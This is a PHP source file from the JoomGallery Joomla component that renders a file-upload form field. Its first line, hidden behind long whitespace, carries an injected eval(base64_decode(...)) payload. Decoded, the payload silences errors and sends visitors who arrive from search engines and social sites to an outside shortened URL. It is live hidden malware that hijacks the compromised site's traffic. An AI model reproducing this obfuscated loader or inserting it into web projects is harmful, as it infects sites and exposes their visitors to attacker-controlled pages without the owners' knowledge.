<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
// $HeadURL: https://joomgallery.org/svn/joomgallery/JG-1.5/JG/branches/report_files/administrator/components/com_joomgallery/elements/thumbnail.php $
// $Id: thumbnail.php 1930 2010-03-06 12:25:59Z mab $
/****************************************************************************************\
**   JoomGallery  1.5.6                                                                 **
**   By: JoomGallery::ProjectTeam                                                       **
**   Copyright (C) 2008 - 2010  JoomGallery::ProjectTeam                                **
**   Based on: JoomGallery 1.0.0 by JoomGallery::ProjectTeam                            **
**   Released under GNU GPL Public License                                              **
**   License: http://www.gnu.org/copyleft/gpl.html or have a look                       **
**   at administrator/components/com_joomgallery/LICENSE.TXT                            **
\****************************************************************************************/

defined('_JEXEC') or die('Direct Access to this location is not allowed.');

/**
 * Renders a thumbnail selection element
 *
 * @package     JoomGallery
 * @subpackage  Parameter
 * @since       1.5.5
 */
class JElementFile extends JElement
{
  /**
   * Element name
   *
   * @access  protected
   * @var     string
   */
  var	$_name = 'File';

  function fetchElement($name, $value, &$node, $control_name)
  {
    /*$db         = & JFactory::getDBO();
    $doc        = & JFactory::getDocument();*/
    $fieldName	= $control_name.'['.$name.']';

    $html = '<input type="file" id="'.$name.'" name="'.$fieldName.'" />';
    /*$html = "\n".'<div style="float: left;"><input style="background: #ffffff;" type="hidden" id="'.$name.'_name" value="'.htmlspecialchars($img->imgtitle, ENT_QUOTES, 'UTF-8').'" disabled="disabled" /></div>';
    $html .= '<div id="select_button" class="button2-left"><div class="blank"><a class="modal" title="'.JText::_('JGA_CATMAN_SELECT_THUMBNAIL_TIP').'" href="'.$link.'" rel="{handler: \'iframe\', size: {x: 650, y: 480}}">'.JText::_('JGA_CATMAN_SELECT_THUMBNAIL').'</a></div></div>'."\n";
    $html .= "\n".'<input type="hidden" id="'.$name.'_id" name="'.$fieldName.'" value="'.$value.'" />';
    $html .= '<a id="remove_button" '.(!$value?'class="jg_displaynone" ':'').'title="'.JText::_('JGA_CATMAN_REMOVE_CATTHUMB_TIP').'" href="javascript:joom_clearthumb();"><img src="images/publish_x.png" alt="Remove" /></a>';
*/
    return $html;
  }
}